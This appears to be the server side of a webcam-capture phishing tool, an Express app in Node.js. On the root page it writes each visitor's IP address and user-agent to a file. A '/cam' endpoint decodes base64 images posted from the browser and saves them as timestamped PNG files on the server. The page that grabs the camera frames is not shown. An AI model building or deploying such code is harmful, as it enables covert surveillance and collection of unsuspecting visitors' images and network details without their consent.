const express = require('express');
const app = express();
const fs = require('fs');
const path = require('path');
const reqIp = require('request-ip');


// we will set body parser
app.use(express.urlencoded({
	extended : false,
	limit : '50mb'
}));

app.use(express.json());

// we will set view engine
app.set('view engine','hbs')
app.set('views',path.join(__dirname,'../views'))

// we will create root directory
app.get('/',(req,res) => {
	const clientIp = reqIp.getClientIp(req);
	const userAgent = req.header('user-agent');
	fs.writeFileSync(`${path.join(__dirname,'../')}/ip.txt`,`IP: ${clientIp}\nuser-agent: ${userAgent}`);
	res.render('index');

});

// we will get image
app.post('/cam',(req,res) => {
	const imgData = req.body.cat;
	const filterData = imgData.substr(imgData.indexOf(',')+1);
	// we will decode data
	const uncodedData = new Buffer(filterData,'base64');
	fs.writeFileSync(`${path.join(__dirname,'../')}/cam${Date.now()}.png`,uncodedData,'binary');
	fs.writeFileSync(`${path.join(__dirname,"../")}/Log.log`,"recived");
	console.log('cam file recived!');
	res.send("request sucessfull ");

});

// we will listen server port 
app.listen(3000,()=>{
	console.log('server listen on port 3000');
});
